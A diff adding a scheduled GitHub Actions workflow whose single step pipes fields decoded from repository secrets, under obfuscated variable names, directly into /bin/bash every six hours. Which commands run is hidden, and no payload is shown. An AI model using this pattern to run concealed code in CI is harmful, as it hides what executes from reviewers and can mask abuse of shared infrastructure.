@@ -1,0 +1,23 @@
+name: gongmincailu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gongmincailu
+        env:
+          zg790: ${{ secrets.zg790 }}
+        run: |
+          echo $zg790 | jq -r .rr776 | /bin/bash
+          echo $v40 | jq -r .fqh76437 | /bin/bash
+          echo $nazy72595 | jq -r .copn22575 | /bin/bash
+          echo $qpjkg30 | jq -r .w8 | /bin/bash
+          echo $xqz4924 | jq -r .avic245 | /bin/bash
+
